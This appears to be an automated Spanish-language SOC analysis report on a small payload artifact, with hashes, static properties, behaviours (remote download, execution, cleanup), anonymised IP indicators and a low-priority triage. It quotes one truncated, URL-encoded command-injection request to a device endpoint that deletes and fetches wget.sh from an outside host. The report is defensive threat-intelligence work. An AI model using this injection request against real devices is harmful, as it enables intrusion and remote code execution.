# 🧬 Payload Analysis

`75007cd893ad5e5a27a760336ca6b337505779f83ddd2c406c13757c06f5295d`

## 📌 Resumen

Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución, Limpieza. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Payload`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:07:53+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `75007cd893ad5e5a27a760336ca6b337505779f83ddd2c406c13757c06f5295d`
- **SHA1:** `0c0570654aeac4b2568efc52ffdd3d3bed710473`
- **MD5:** `ee4699a4cfe41d0ab725348d88a4ecca`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 451 B |
| Entropía | 5.73 |
| Strings | 9 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F85.239
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 143.0.0.XXX | static_analysis |
| ip | 190.179.177.XXX | static_analysis |
| hash | 75007cd893ad5e5a27a760336ca6b337505779f83ddd2c406c13757c06f5295d | static_analysis |
| command | POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F85.239 | strings |
| ip | 85.239.151.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
